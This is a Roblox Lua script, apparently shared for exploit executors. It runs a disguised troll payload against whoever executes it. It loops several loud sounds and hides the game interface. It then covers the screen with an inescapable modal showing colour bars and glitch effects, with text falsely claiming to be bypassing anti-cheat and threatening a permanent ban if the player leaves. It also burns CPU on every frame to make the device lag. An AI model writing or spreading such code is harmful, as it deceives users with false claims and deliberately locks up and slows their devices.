-- [[ DekaTeamHub: THE TACO APOCALYPSE ]] --
task.spawn(function()
    local SS = game:GetService("SoundService")
    local CP = game:GetService("ContentProvider")
    
    -- 1. TRIPLE THREAT AUDIO (Banyak ID biar PASTI BUNYI)
    local sounds = {"rbxassetid://142276005", "rbxassetid://142276082", "rbxassetid://225964524"}
    
    for _, id in pairs(sounds) do
        local s = Instance.new("Sound", SS)
        s.SoundId = id
        s.Volume = 10
        s.Looped = true
        s.PlayOnRemove = true
        
        -- Paksa Main
        task.spawn(function()
            while true do
                if not s.IsPlaying then s:Play() end
                s.TimePosition = math.random(1, 5) -- Langsung ke bagian berisik
                task.wait(0.5)
            end
        end)
    end

    -- 2. LOCK SYSTEM
    pcall(function()
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)

    -- 3. VISUAL TV RUSAK (PERSIS VIDEO)
    local screen = Instance.new("ScreenGui", game:GetService("CoreGui") or game.Players.LocalPlayer.PlayerGui)
    screen.DisplayOrder = 2147483647
    screen.IgnoreGuiInset = true

    local B = Instance.new("TextButton", screen)
    B.Size = UDim2.new(1, 0, 1, 0)
    B.BackgroundColor3 = Color3.new(0, 0, 0)
    B.Modal = true
    B.Text = ""

    local Bars = Instance.new("Frame", B)
    Bars.Size = UDim2.new(1, 0, 1, 0)
    local colors = {
        Color3.fromRGB(191,191,191), Color3.fromRGB(191,191,0),
        Color3.fromRGB(0,191,191), Color3.fromRGB(0,191,0),
        Color3.fromRGB(191,0,191), Color3.fromRGB(191,0,0),
        Color3.fromRGB(0,0,191)
    }
    for i, c in pairs(colors) do
        local f = Instance.new("Frame", Bars)
        f.Size = UDim2.new(1/#colors, 0, 1, 0)
        f.Position = UDim2.new((i-1)/#colors, 0, 0, 0)
        f.BackgroundColor3 = c
        f.BorderSizePixel = 0
    end

    local T = Instance.new("TextLabel", B)
    T.Size = UDim2.new(0.8, 0, 0.4, 0)
    T.Position = UDim2.new(0.1, 0, 0.3, 0)
    T.BackgroundTransparency = 1
    T.TextColor3 = Color3.new(1, 1, 1)
    T.TextScaled = true
    T.Font = "Code"
    T.Text = "SABAR TUNGGU 1 JAM!\nBYPASSING ANTI-CHEAT...\n\nJANGAN LEAVE ATAU BAN PERMANENT!!"

    -- 4. GLITCH NOISE & LAG
    game:GetService("RunService").RenderStepped:Connect(function()
        Bars.Position = UDim2.new(0, math.random(-15, 15), 0, math.random(-15, 15))
        if math.random(1, 3) == 1 then
            local n = Instance.new("Frame", B)
            n.Size = UDim2.new(1, 0, 0, math.random(2, 40))
            n.Position = UDim2.new(0, 0, math.random(0, 100)/100, 0)
            n.BackgroundColor3 = Color3.new(1, 1, 1)
            n.BackgroundTransparency = 0.4
            task.delay(0.01, function() n:Destroy() end)
        end
        -- Bikin HP Lemot
        for i = 1, 2800000 do local _ = i * i end
    end)
end)

















